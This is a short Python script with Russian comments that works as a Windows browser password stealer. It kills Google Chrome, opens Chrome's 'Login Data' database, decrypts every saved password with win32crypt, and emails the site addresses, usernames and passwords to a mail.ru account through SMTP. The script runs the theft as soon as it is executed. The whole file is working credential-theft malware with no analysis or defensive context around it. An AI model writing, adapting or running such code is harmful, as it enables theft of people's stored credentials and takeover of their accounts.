import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from os import getenv
import sqlite3
import win32crypt 
import psutil

# coded by Jewwh

def MY_SMTP(login_pass):
    my_mail = "YOUR_EMAIL" # Ваш логин от почты mail.ru
    my_password = "YOUR_PASSWORD" # Ваш пароль от почты mail.ru

    msg = MIMEMultipart('alternative')
    msg['Subject'] = "Google"
    msg['From'] = my_mail
    msg['To'] = my_mail

    html = """<html>
    <head></head>
    <body>
    {}
    </body>
    </html>
    """.format('<br>'.join(login_pass))

    part2 = MIMEText(html, 'html')
    msg.attach(part2)
    mail = smtplib.SMTP('smtp.mail.ru', 587)
    mail.ehlo()
    mail.starttls()
    mail.login(my_mail, my_password)
    mail.sendmail(my_mail, my_mail, msg.as_string())
    mail.quit()

def killchrome(): # Закроет принудительно Google Chrome, что бы база (файл) Login Data не была занята
    PROCNAME = "chrome.exe"
    for proc in psutil.process_iter():
        if proc.name() == PROCNAME:
            proc.kill()

def LoginData():
    killchrome()
    PASS_LOGIN = []
    # Подключаемся к базе данных "Login Data"
    # Записываем в список всё из таблицы logins (значения из трех столбцов)
    conn = sqlite3.connect(getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    # Пробежимся по каждой строке из списка
    for result in cursor.fetchall():
        # С помощью win32crypt расшифруем пароль
        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        # Если пароль расшифрован записываем в список адрес сайта, логин и пароль
        if password:
            PASS_LOGIN.append('URL:{}, | {}:{} | '.format(result[0],result[1],password.decode('utf-8')))
    MY_SMTP(PASS_LOGIN)
LoginData() # Запускаем функцию
